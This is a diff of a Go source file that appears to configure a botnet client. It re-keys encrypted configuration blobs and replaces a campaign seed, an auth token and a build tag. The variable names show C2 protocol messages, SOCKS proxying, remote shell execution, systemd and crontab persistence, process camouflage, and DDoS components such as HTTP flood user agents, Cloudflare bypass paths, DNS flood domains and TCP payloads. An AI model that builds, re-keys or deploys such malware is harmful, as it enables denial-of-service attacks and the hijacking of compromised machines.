@@ -20,13 +20,13 @@ var verboseLog = true
 var serviceAddr string
 
 // configSeed is the 8-char hex seed used for key derivation.
-const configSeed = "5146ce44" //change me run setup.py
+const configSeed = "46f8a5a2" //change me run setup.py
 
 // syncToken is the shared auth token — must match server.
-const syncToken = "aq7j6KK4O&iUoYTk" //change this per campaign
+const syncToken = "jWwk&7Zfo&dHPbvB" //change this per campaign
 
 // buildTag must match the server's version string.
-const buildTag = "V4_3" //change this per campaign
+const buildTag = "v5.9" //change this per campaign
 
 // retryFloor and retryCeil define the range for randomised reconnection delays.
 var retryFloor = 4 * time.Second
@@ -147,120 +147,120 @@ var (
 // --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
 // @encrypt:single — setup.py uses these tags to identify vars for re-encryption
 
-var rawServiceAddr, _ = hex.DecodeString("bacb8dba51fd1102a25cbdce1e5babf779012b7937e85adb4582a2802804135ec72225fdc379edb646a9a818") //change me run setup.py
+var rawServiceAddr, _ = hex.DecodeString("280f97a0ed6a87239e2746cf087c3fb9c891738b4c39e0701fedf1262de4d37bca4c748e7afb7b93806955a1") //change me run setup.py
 
 // @encrypt:slice sysMarkers
-var rawSysMarkers, _ = hex.DecodeString("a12914e5ffea7cacbc628a848b7df3d9f97e2cb123ef54fe5a4648909a70b5781bb65bd628bd6b41e3bd73233ec101fba7847833ac537afdf2888034a4337ab7835852639887af69e17467a79291658744213a67fcd31aa092cd0ef221a3ae54273fa26c489aa8c4224757dadc3d95df3c332afd3d")
+var rawSysMarkers, _ = hex.DecodeString("ac088b3b74236a30fa598b4190d82833327ddfa6d7689b7d4d7ea2df38f8146e9d731bcf51a3d84f398d6f3d5a2afe171a44b7e158e1d75f4baa9a07d6d0509f1cb627738def1f213def8ec144a72c28647105566a9b7e3f6dd785ca68acb4af298b5105fd15974abe462339ec82b756414838b871")
 // @encrypt:slice procFilters
-var rawProcFilters, _ = hex.DecodeString("15cae8e1df82a6c77b8db4a5452d63e6e2249eb0439c9fb6e4fd5c9c0c2a68c277e105742546b019bed266206be75fb207ea250328d1869bea9708ee0ca7a6407f2b7bd93747d23ab453")
+var rawProcFilters, _ = hex.DecodeString("fdded32255f159855107a95a3289f3842c88fed3527e636a9633a46d8afbc59b9217eb8696e9ab98ce344a9161bf1ff3878baef59983f6cbee99649193966a945dac58e50ae9e793034d")
 // @encrypt:slice parentChecks
-var rawParentChecks, _ = hex.DecodeString("fc20339d802a1e8df304137fc33dfebaa6f0961a46ed9a60a2fa6efae84d286b")
+var rawParentChecks, _ = hex.DecodeString("36444103fdc625cc2a5fbc161a315fc1157ee00762c9c23cc4c12c2be3068a1d")
 
 // @encrypt:single rcTarget
-var rawRcTarget, _ = hex.DecodeString("8a4ca8578c4a25ce6c5b7505b021fd2c482f3566d5ded85fe9fb868409")
+var rawRcTarget, _ = hex.DecodeString("40b2b56063899693057a5d568ddb32102ef0d9f140ace144290897f8be")
 // @encrypt:single storeDir
-var rawStoreDir, _ = hex.DecodeString("70ef7511521a93d046cd2a7910621398475d5c8d28fdb62a1a804f81065c5a2688f390cd07")
+var rawStoreDir, _ = hex.DecodeString("7e416092e8af2cdc84e0c78c50677a227c728289669bc4240f67dac356c93997c58798ec22")
 // @encrypt:single scriptLabel
-var rawScriptLabel, _ = hex.DecodeString("77014e1523f6a944137150fdd17ff3a88a6baaeeb23869e2e9b26309d8b44a")
+var rawScriptLabel, _ = hex.DecodeString("b986061182ba132507805db83f1bbe22aa6c5b7350c4bc2cc03795bc77a452")
 // @encrypt:single binLabel
-var rawBinLabel, _ = hex.DecodeString("6e6ea706f1fec9a5759d68568f9a1378ac0b976f3323bc927fa4a0e2a9")
+var rawBinLabel, _ = hex.DecodeString("4334ec89b7a954addcd526b8c79f9865eebca6bb511896c608ddf19d69")
 // @encrypt:single unitPath
-var rawUnitPath, _ = hex.DecodeString("f640a2f7d76e20c12323db7fea5896c9fac995f3e6a4ff48bc86f30d4dbc56fbf71cdbbd3efc753cc73c734d8e66014daa1bc9b68837b8")
+var rawUnitPath, _ = hex.DecodeString("3412d2eba2f2dae3bc4f2ddfeb152f527b22da82c89d25999672018a6564b359cc4945cb2cfc5ddea450e6de495b45fe42d29df0ce7451")
 // @encrypt:single unitName
-var rawUnitName, _ = hex.DecodeString("65c95b2478059c1fc145d03b2901ab3f544877024319541d11b2fbf983186a3498faf4")
+var rawUnitName, _ = hex.DecodeString("8cf7345b16d2e6c2103d00422673cac411f201b2ad06a9620dd427d3faeb728947f93b")
 // @encrypt:single unitBody
-var rawUnitBody, _ = hex.DecodeString("c90b51f15195f5cf7a3b12fd321f7bed2b5878cfb616b9bdc847d513fe265b4d93a5eed72cab569487516fabe58fd303b88a1cbeb35901d2f3ab37b7bd43ea8cc0b2afca56ba9cf3728362e9d1ed9b7c3d6106327786cb6450f48f12a6facfbc1c0520dc3561aaa4150d4e494ec5824dd78b0d9483646839bef9d308b295feec2c507b9c8ef71894baf581bed29e70006af41479cecb14c8423bf52b8ca12616db6b55f7ac9292bc01791303ed8df4c7dafba52c35f3f8e6bdff964e5d115c3611f3151cb301e7e74cfa290343d1d4")
+var rawUnitBody, _ = hex.DecodeString("64f346c7425d6ca6dde0a2c87a2bea6b624d2ed309798c248e3c593322790901dd24bf773ac2817bc9066b2c9a3a44decd655166181533fc50e1864ff656fa991c216c530ec50ddc51eb274486a736d6db63720688d17d77591d81f104b7199a588ad42852e4328b857407505115bd462ab20dcf1c3c1f9dff1271ff7349731f891189eb2a5594ffb22c558ff97d5bd9e73edd8efcc4f102d6f9970f457a91ff3aa2aead11a2a7713c7a12abf880dedbb95e0f3bd2da2c925b7a0389e7d2a3a50aa0f4e6834281d1ada97e4ae19faa")
 // @encrypt:single tmplBody
-var rawTmplBody, _ = hex.DecodeString("05ef7dfcd56286399d70375af44826317e6f8c6ce5599aa74c9d13d33b37276bb134d60b86d4e2e1036eed07a96266c049f25c9d7b7cbb4728753c89b70cc2cc9376f5cbe41a353ff6eea63f64248f7b5c58073ebe934f06219a4f219a2ccd5458453ec31889c9043291aa8c2fce1e23162ddc2f24b63db95b5a9af79e36719a570321b9e0d0f38c10077ee36cf91b2f85fa25dbe7d5542441891822074ca59ce998af739864eec9b8211dc6acae4a58a2ef84f64effa40390bbe7d1d658254d84c43357da49")
+var rawTmplBody, _ = hex.DecodeString("0c8e2b4be2f48cf1b09c6ce9589e4d3a8ddc7c5e0934883790050709ba9d902ca6e6d192a6ae6642fb30a705e40d4f0d780a1d702641418d6eac75896921a931b9eda7817e98343ef2636e4989a751d6574c70f8e74ec7edc31de55b3be4608d91fb1bd738c799cc39d09223a8a6857b0650bcaa5cb67c417414292c013d73f282abce455b2ced7abc86e755dc1f969166a5a0c5ceeb20a9273fe51aead88f6bad6b0b7623696f8e1f6f88aaa44a5776fb1a337e724a890d424251ae5c11112a777ff93d980c")
 // @encrypt:single schedExpr
-var rawSchedExpr, _ = hex.DecodeString("4ba5e9c07afe3126916bacaddf2be8e84286159e97ea698dfd")
+var rawSchedExpr, _ = hex.DecodeString("bb589907dfa99c692737cd5943a91af0f725e53285889f4d62")
 
 // @encrypt:single envLabel
-var rawEnvLabel, _ = hex.DecodeString("11830a5525c8a610ce6d7f54a8f686c39b331cbe3bf82c58f9d3e3ada2")
+var rawEnvLabel, _ = hex.DecodeString("d0fc58d32cfb8b1d8d9a8a5787f01d91abef6f119a269fa66dd47813cf")
 // @encrypt:single cacheLoc
-var rawCacheLoc, _ = hex.DecodeString("a686c0adab927cbe20494d6412c2e4fed8f38a00880d67a7b289cd45bc599cbdc70dae6fd90e41")
+var rawCacheLoc, _ = hex.DecodeString("a0d2ca3c28c100b3ee950eb5f8a9be04932a7559f95fd2b11fac20037830521471991e9e0fdae2")
 // @encrypt:single lockLoc
-var rawLockLoc, _ = hex.DecodeString("8e2dde82c0fff5d34e874bebf632832cfe37ffbaaa9b858ea580c060b8968271cce311d945bcc69f3c2d39")
+var rawLockLoc, _ = hex.DecodeString("f59553620147e1939ac987520a271d4d909f5dd76d005e142e5895c0c8fb73b584878cc4435f1b40e53b96")
 
 // --- Protocol blobs ---
 
 // @encrypt:single protoChallenge
-var rawProtoChallenge, _ = hex.DecodeString("0bb35dcbdd76c7aefd049313b82d1b71cb73fa314508d8ff642e26de7422b1")
+var rawProtoChallenge, _ = hex.DecodeString("d84d6b76a2a9ba1a4d01d52da27986652a0a9b136e3a4dc3eb89ec287d6d79")
 // @encrypt:single protoSuccess
-var rawProtoSuccess, _ = hex.DecodeString("7064bee29d6b07cbcf2f9aba6bd05aa8a403ebd412415e631aa9292e")
+var rawProtoSuccess, _ = hex.DecodeString("7aa291f8c78d71c3c2c4bb14fb4da280c41853fc40f05555ad9bed9d")
 // @encrypt:single protoRegFmt
-var rawProtoRegFmt, _ = hex.DecodeString("912f490013d041f22072c3f3a7826d4dacccbf135677151c0850be2a6beeaea256063ed05a54786e719e3674a0856c68")
+var rawProtoRegFmt, _ = hex.DecodeString("41f42e60db6385e5142f985ac8e89a08ed0bc3e4dba51c6d47fe1749dde6556a8fba310a6a06bb0660e6802a6abdd1eb")
 // @encrypt:single protoPing
-var rawProtoPing, _ = hex.DecodeString("d208049fc50e9e468cdef8c4cae7d3f5323e554b")
+var rawProtoPing, _ = hex.DecodeString("2be6d45fb1521292aca93b67e10b791a54dcf0ae")
 // @encrypt:single protoPong
-var rawProtoPong, _ = hex.DecodeString("6ae1f4eb56b2559fb04fe7bcf8484ab682e38a2672")
+var rawProtoPong, _ = hex.DecodeString("185b0df5ab6a012e17a89091d5ae29efd5e5bc432a")
 // @encrypt:single protoOutFmt
-var rawProtoOutFmt, _ = hex.DecodeString("0bcc2ef9077ff6132f9a4f2e6262c5e715b16d68db1120f49c6c12a7939554")
+var rawProtoOutFmt, _ = hex.DecodeString("08a2521bf4d1657fe385b6866bf97543e2e918e0a8b5d6baa6fa42aebd0ac5")
 // @encrypt:single protoErrFmt
-var rawProtoErrFmt, _ = hex.DecodeString("af5f859d44fbf6bf86983429cea73057b449ea4792419e0aa40a")
+var rawProtoErrFmt, _ = hex.DecodeString("5346eabfb86dca9c71951f94ced139afe8525192d3d6c949edd1")
 // @encrypt:single protoStdoutFmt
-var rawProtoStdoutFmt, _ = hex.DecodeString("73649b2b1af44060fb8a231d3d3dd5d220f3873de4739b6f4ceba1")
+var rawProtoStdoutFmt, _ = hex.DecodeString("2010ff2f0ca4376a9ba737e53b98172673770bbb122236783b19b5")
 // @encrypt:single protoStderrFmt
-var rawProtoStderrFmt, _ = hex.DecodeString("7262b8fb081e0b9c473dba0aa7e43c75607d843561aa6b82cab8e6")
+var rawProtoStderrFmt, _ = hex.DecodeString("a142c7c7522bf386ce914d5f0501025911dce7a9adfbba0830fb9c")
 // @encrypt:single protoExitErrFmt
-var rawProtoExitErrFmt, _ = hex.DecodeString("0b79b5fde3d41b172c61e88e308f2e5a0e606ce263fbcffcb68afca74ecbbd")
+var rawProtoExitErrFmt, _ = hex.DecodeString("582d26cb86d7cf1c58572e815721b74da436d113ae0c75e68b617c8fcf3bb8")
 // @encrypt:single protoExitOk
-var rawProtoExitOk, _ = hex.DecodeString("63bf8a9bad9cc367503f6696987ad0ad30dafef3e32c0385c4a38dc27500422567312bb136299b0d7dda17def59c0b29a5247b7bc6")
+var rawProtoExitOk, _ = hex.DecodeString("1882d0c07797739c8a032f2a09a36009dcaa6c2113976a838bb1eeaf83701b89b97eef0705a62a345c070c5537a5abfbb940299b92")
 // @encrypt:single protoInfoFmt
-var rawProtoInfoFmt, _ = hex.DecodeString("0732c58ebd2c2aade9bfe7340166699055974201c53c144d73")
+var rawProtoInfoFmt, _ = hex.DecodeString("9b7f3ed30b3e0e82aa10a379852de97cb96af7bad6d068b545")
 
 // --- Response message blobs ---
 
 // @encrypt:single msgStreamStart
-var rawMsgStreamStart, _ = hex.DecodeString("09b268277f0802ba0a9d900f8a825c26cdf5402a4758e0b202ba25368ae246b5f49e")
+var rawMsgStreamStart, _ = hex.DecodeString("abe5bd9573304818f6b64e7725c17ab2d5e67e0865e8ca3af4ff721cbee06421a209")
 // @encrypt:single msgBgStart
-var rawMsgBgStart, _ = hex.DecodeString("e1d0339b1919a90efde0dd7252212ba30f782ab7530dbd13012d31aa78f49b7ed9a05409df83a827fc540baac1c9")
+var rawMsgBgStart, _ = hex.DecodeString("a5b94121d17e14616d99db5f5d12e2475e3e472e121599239f01cbdff74f175c20f032766fd28ea1b265e3aa4738")
 // @encrypt:single msgPersistStart
-var rawMsgPersistStart, _ = hex.DecodeString("29eef8ffe775830506435ed1b0497d613b867ea23c514234a39ccc8bfb9954ed84ebf63cc9a59a16e570de60")
+var rawMsgPersistStart, _ = hex.DecodeString("0391e3e7b7249e6c0612d49aa2cbb0d62c7ae5d4e86379b4f93addfe8c409e05a4c75740028f1864134d037a")
 // @encrypt:single msgKillAck
-var rawMsgKillAck, _ = hex.DecodeString("428f9996a0d8ca5baeea72e6e55607e88df7e948f7d1770ae4f5afd4ec335e7e108a30398e3576ca110ef6eb5f8bd039ef125479cf8f9602bd0d")
+var rawMsgKillAck, _ = hex.DecodeString("0c25f27a468d68caa6436d5ce3f2dcc3cc945fe7c8f1cbc3e6ec117516bc05b8b8848579aa94683f17c6f818a234d466e5115eed036798087dfe")
 // @encrypt:single msgSocksErrFmt
-var rawMsgSocksErrFmt, _ = hex.DecodeString("fe9624c29519f30fa72b56692c677c13a21aff6a36212f51491f940421c61665")
+var rawMsgSocksErrFmt, _ = hex.DecodeString("088c9ae37303e5f76b7366525ef261a3d00dcdc579ff9e456554128897201f2f")
 // @encrypt:single msgSocksStartFmt
-var rawMsgSocksStartFmt, _ = hex.DecodeString("3333e04b8425a69e66fdb975e859bb51be109c86330745a7990e65771c6add9e5ac8b64106fa89ed7a9103d93becfbb1")
+var rawMsgSocksStartFmt, _ = hex.DecodeString("d3b69dab7aaeb3088e1ee46911eaa2fa6da35efb5c2238846a68f0c0383d5966f6695c14c68e0bbfff2816057cde11e0")
 // @encrypt:single msgSocksStop
-var rawMsgSocksStop, _ = hex.DecodeString("14aab83cb2aa33e367780267dd829176365258da571d0da4c39687949d3eedc046905b83cc")
+var rawMsgSocksStop, _ = hex.DecodeString("0706e82db6af80fe2f67b29eac6068e3a3d27fe81ede96f57d52450ad4d7bbb98c0a37c057")
 // @encrypt:single msgSocksAuthFmt
-var rawMsgSocksAuthFmt, _ = hex.DecodeString("5070693c8cf047e6ca3114533f4907752602bd534df82789b698c5b508bafdb939d89547e0650bb4ba9cead8974553")
+var rawMsgSocksAuthFmt, _ = hex.DecodeString("b3038a4cba9304c4e5ecbd5ad1f6b14aec37166fd3955fcec9daa98191cd8eddcbf1ccd6ae68dbb59b2084255c7258")
 
 // --- DNS / URL infrastructure blobs ---
 
 // @encrypt:slice dohServers
-var rawDohServers, _ = hex.DecodeString("585f719169fc50156f8b1313618e6a524d5ff5bdd42855d93cd30cd6592e4d6ad18a7329513733c8ba0675bd44204bb9e958c011172f11569dca821ae20aa203ff2108e0992e788892379b07eb2ec03dd0f56eee049e4bdd471246b37bcfb4cbbf78cb10c453f4468841a2955c94bf5a60")
+var rawDohServers, _ = hex.DecodeString("ac7e3e32850e1d8eeb29d840f446641d6fac0973cd3c4d6d38a4532723fbee443b0fa4ff5988badb0610a4385bfc438487bb50eb54ba05140c4c3eba1c989a5b76aacb4b863cb81023fde533a0424c6b612ac54aa6c45a1851429a4177ee4fa7927e92c5cf77a88eb28657048e6e475372")
 // @encrypt:slice dohFallback
-var rawDohFallback, _ = hex.DecodeString("fdaf29887588e314393657c39d3a7e325760f233e1cea91f842cb8be59880548ecd602f9bc7e9ed49b36f6994c40fff2235c7d4492db78d7c9f29300f83f40e08ca1b181f814d30a27aad665585731d60c")
+var rawDohFallback, _ = hex.DecodeString("50ab0f7ad4d55cc84eddbf9d7b7c7d9090828322b0e12e4bc31353fb00f5e9ea6459254858df10791a2f3bb411e86a86cba076280b11ced73c0eb32ba88b8ce08c7498e0d1a654a9b5bbe678f925505cf8")
 // @encrypt:slice dohAttack
-var rawDohAttack, _ = hex.DecodeString("6374c5e7443719dfaab75c3db2fd6ca624b6590913c3aeea2d50352f157f16d6ddf7d2f219770829addddf6dc7b9cf6682722ffde4661e6d5fa305963841d1948f7ea2551e97d18bb1879b88b4fe")
+var rawDohAttack, _ = hex.DecodeString("90eae7616dfca253685ec7f316a722e2cef8b1f2e3d1d6118cbf4b5f2380da52ed40ea7ce5fe2dadcbc0af676980a14d815e98d2e4608304b9a3ebd6a9428fa9a7bbbfac525e455bb649700e9c21")
 // @encrypt:slice resolverPool
-var rawResolverPool, _ = hex.DecodeString("74f5b0ab3a80dd15f4cbd3ceba0f234ad06947804aa403183c341ed0c6f2bc6ed616bb590e12be6ead433814b087d1c1b37f8c9e201736b614bcfee530051fafd2a3e2010bebc7bbcaafe0de1e")
+var rawResolverPool, _ = hex.DecodeString("cfe66765f6114f3296f046615fbf679d92cb66b4782afaa17534eb187e1864c961fdfd34e157144ab5abc57606134008892edc8b7fa73ff909a66047046de0c4672d314072114ddb721130b62f")
 // @encrypt:single speedTestURL
-var rawSpeedTestURL, _ = hex.DecodeString("ba515530625a14f8ab36de85894f8462ed2b9fa4bbdc6256eb7e8b2c17455d4bf6703026cd6a989854d654aec45d5509558e09141719089dd07221c180dbdf")
+var rawSpeedTestURL, _ = hex.DecodeString("bf1b9aacdab6348dffd1861a54266b43ac1a675197a666712fdc864b0f41234515da3b7ac5197a1e4ab37a507e55c0f49cc5c1857411c385d56942a1ecd269")
 // @encrypt:single dnsJsonAccept
-var rawDnsJsonAccept, _ = hex.DecodeString("48810d40f3e6ba488a887e4229daabe2a4972f5014c15060e93e84659e5fd0b149911222")
+var rawDnsJsonAccept, _ = hex.DecodeString("c0b5d16433e6ba15113a068b50eecd984a54c428973af924cfff9b261ddda6df5e354c03")
 
 // --- Attack fingerprint blobs ---
 
 // @encrypt:slice shortUAs
-var rawShortUAs, _ = hex.DecodeString("09fcfa2d61a315471e2fc778938ea11443301716d3edc1cf4ce599e211eb3bb0a93d917b80c7ac954434acdbb6f9b4b2ffa92a4d2678e7c85607677297f507fa72d07ad0e5d53b245dfa14d488b5e9bf205b7bdda0624c71f24e9c7c0aa75600daa1a1145f913cc92ce51a08fab7947a945ede68b3d4cb47d895aa2c8a424400aa167861240251bb6e1d467863a3f5d3f68255a601009def7983d34acbb44021309f4ecaa8adcb8c8e65ca154ff66bc8a99c276e6d31b84aa645363d157c3452aa947514bc19fd89e9bea221b980dec43b54412574cf6ea514f8f76082")
+var rawShortUAs, _ = hex.DecodeString("919d62442376b6fdd7277bdf2593170e96cc2f1023ada4bbbd6b88172b39b16fc8ee94cea4cd76e8d785981d1e7925a87c1c680ea10ad7f6cb8eb9e18d0a2292d0d3df323b67a2acb2fb23fed747630402eba7b29a42f358ca5f43c464cacaef6e08d7a2151c9376a9fe8e51d12492f821ebe1bfa13c35c74b786e7f44fd9e9044689610b9f66297ee4306330fe26c7f86014b7eda7441e77c2b6e687b85b8f7f7be25771227da2b982c01aeb8b8ca9ccd783746d853ec5238053652d306841b123ffd743cffafbe3c86944171aa3caf50727d4707b5d33faf1f3e110d")
 // @encrypt:slice refererList
-var rawRefererList, _ = hex.DecodeString("29ae226435347468dcf116effd400a20533a710e656833c7345fa39fcc9bbb635ab9871be4419682de4a547acfbe952390e3b7a3690edece9cc4be442fa655bbf7beaf7f20b4fd02053b02c81190f85764bf04b1fd89c2cd585175")
+var rawRefererList, _ = hex.DecodeString("7a8f4e75fe647172eb9373c197f849fa4dbd7184dea0440ff61766e66f31596dbe304da0bfba8aefca52a845f88fed4f9260526fd7ffd6618cef6795f22c91fc09a00c5c2a88e124d34bd301a86496b9e8d4308e56cc2bf4df5613")
 // @encrypt:slice httpPaths
-var rawHttpPaths, _ = hex.DecodeString("c0d0a48097804145c93827563edda18046791dd7f331aee49db96224589ee0984a5ddd9aeafd3965f18aad803efc2bd6aef56cfc34ba3eb31434ff")
+var rawHttpPaths, _ = hex.DecodeString("87a32f2fe43768cce686c70c9c5642aaacdfe19ae7ccd4df1a5df4575e7a82be8681d90584bcb412e8e612e78d20ada88f5a1182eacce723906d07")
 // @encrypt:slice cfPaths
-var rawCfPaths, _ = hex.DecodeString("ebc439dfa60ed3fb2c18de3c291d026435552f6144af904650fa5d6f93e4a3ed31789c298532171fee02a299476f895ab2805ed91c58035eae70f9ce0b8ffbdab8f55ba06b62161304")
+var rawCfPaths, _ = hex.DecodeString("2d9e6ccaafd5037da593655fe92e8ba19e3dd971e5d30f3ed23b1cb2a1de04b2c1ce806ed556ca713051bfdc7c0f1cd6e368a1b62bf2c20469f85f59210a95919ee6422100993600cc")
 // @encrypt:single cfCookieName
-var rawCfCookieName, _ = hex.DecodeString("819cb1b73dcd72da1264336935bb26345c986c0489ef7c")
+var rawCfCookieName, _ = hex.DecodeString("0a235aae19b83efd44b2ad07e0dcd3386afbf2ddd9adae")
 // @encrypt:single tcpPayload
-var rawTcpPayload, _ = hex.DecodeString("f67f36d8dded5f21495fcf396b9ba836ce1ea5bfb9644735836606a1831678adda8d")
+var rawTcpPayload, _ = hex.DecodeString("3cbb3b092124ccae233d1c99f21f099bce519eead4d52b91f564f3f20e38e4188c0f")
 // @encrypt:slice dnsFloodDomains
-var rawDnsFloodDomains, _ = hex.DecodeString("be5a7df4b9c33a6d7d7e705713b614734e867022bb98299ef09c86ba1fc7b5ed2e3356d061dc3eefa9c04d699bf034f83c31218a19a7219a7d92802466e2cc333f04ffb166c4353411eaa3b24065f472315379344a40804c3f372616925143")
+var rawDnsFloodDomains, _ = hex.DecodeString("7d5936550932e7a71a28599539ed45cbd65391e0120ab24da1c0929133ab9c53707ad1de3e25c7ef48a19245de63d26281a7f10dc79ecc6bb5db9f0a534fd04d7ac7f14a3633e8af46d5d5e78fdfb4537ddab3b7cc3cfcbae5577399b52d25")
 // @encrypt:single alpnH2
-var rawAlpnH2, _ = hex.DecodeString("cdd389ea20c14373642d865505fb34d5f589")
+var rawAlpnH2, _ = hex.DecodeString("8ca393122b018fa46917cc742e331b79817e")
 
 // @encrypt:slice relayEndpoints
 var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays
@@ -268,27 +268,27 @@ var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — emp
 // --- System / camouflage blobs ---
 
 // @encrypt:slice camoNames
-var rawCamoNames, _ = hex.DecodeString("96c38aaa0ecd801d24ea588af44f339c38db734d02b8cd8bf7d43d000e63184e6c39c860d3ce344936ac54de5da7bff79e32571dcf")
+var rawCamoNames, _ = hex.DecodeString("9792ef3253db7b43cec8e55974dbddb8f04692224ebc2739d07eede8848c533d6cc90e6a8da91448bce72440cd055e824b33729b14")
 // @encrypt:single shellBin
-var rawShellBin, _ = hex.DecodeString("4bbe6891b68ac7e6db83f77ef7a54a2585b4")
+var rawShellBin, _ = hex.DecodeString("7f8b5f82621c08efeebb131ea85348597a16")
 // @encrypt:single shellFlag
-var rawShellFlag, _ = hex.DecodeString("ef01916131b55a620f872f42dd990720fb73")
+var rawShellFlag, _ = hex.DecodeString("feabbc4b1bb08eafd4fa63e03360b8cefded")
 // @encrypt:single procPrefix
-var rawProcPrefix, _ = hex.DecodeString("c62339d16390ca41c7b349aace9247d3f4e5c25071ee")
+var rawProcPrefix, _ = hex.DecodeString("4579c3b573828dafb5576bb49e38a59593762bd4590b")
 // @encrypt:single cmdlineSuffix
-var rawCmdlineSuffix, _ = hex.DecodeString("183b1557c91e22d361a834d7d2411d716a88dae08a2e89db")
+var rawCmdlineSuffix, _ = hex.DecodeString("65403aaa3ee1096067ae803fc0f962b4c0980faab81d48e0")
 // @encrypt:single pgrepBin
-var rawPgrepBin, _ = hex.DecodeString("dd2a48c62ee46556e7dd8519347cf230da97dd0832")
+var rawPgrepBin, _ = hex.DecodeString("5e3bb5309c630f2ec4577b576bfe320746bac00388")
 // @encrypt:single pgrepFlag
-var rawPgrepFlag, _ = hex.DecodeString("cba39a4067b3e6ba82d2bfc8e332f88e0c02")
+var rawPgrepFlag, _ = hex.DecodeString("c7d1a803d89040b34b13b3de46c8ded23562")
 // @encrypt:single devNullPath
-var rawDevNullPath, _ = hex.DecodeString("9ec5211c34ec2fc440759321df526b44b2810dce4a429f670f")
+var rawDevNullPath, _ = hex.DecodeString("a292f245094c94298f2f03d36c6df8c8b8bb84636e4f9a968c")
 // @encrypt:single systemctlBin
-var rawSystemctlBin, _ = hex.DecodeString("9c2f013149ca30f7c2933532349b75627897de8cd640140bb2")
+var rawSystemctlBin, _ = hex.DecodeString("bea8726e372d39abe36bcbc9934403ae0efc75a49df358a1e3")
 // @encrypt:single crontabBin
-var rawCrontabBin, _ = hex.DecodeString("3e919eeeeefffd566df4079921a98213204c8ed03cd284")
+var rawCrontabBin, _ = hex.DecodeString("0d81ef3e6b2f5c5a934f0691c20869f4c44b1b777df6e8")
 // @encrypt:single bashBin
-var rawBashBin, _ = hex.DecodeString("2452e45e9b6a94d535b3be75a0f1b858a43ee297")
+var rawBashBin, _ = hex.DecodeString("9af8aed86d59072a3a760e2c21c07e6e3941b112")
 
 // initRuntimeConfig decodes all raw blobs into their runtime variables.
 // Must be called once at startup before any code references these values.
